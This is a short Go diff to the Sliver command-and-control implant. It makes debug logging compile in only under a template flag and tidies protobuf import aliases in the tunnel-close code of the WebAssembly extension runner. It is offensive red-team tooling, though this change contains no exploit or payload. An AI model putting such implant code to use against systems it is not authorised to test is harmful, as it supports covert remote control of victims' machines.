@@ -4,13 +4,15 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+
+	// {{if .Config.Debug}}
 	"log"
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -148,12 +150,12 @@ func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, w
 		// {{if .Config.Debug}}
 		log.Printf("[wasm] Closing tunnel request %d (%s). Err: %v", tunnel.ID, reason, err)
 		// {{end}}
-		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+		tunnelClose, _ := proto.Marshal(&pb.TunnelData{
 			Closed:   true,
 			TunnelID: tunnel.ID,
 		})
-		conn.Send <- &sliverpb.Envelope{
-			Type: sliverpb.MsgTunnelClose,
+		conn.Send <- &pb.Envelope{
+			Type: pb.MsgTunnelClose,
 			Data: tunnelClose,
 		}
 	}
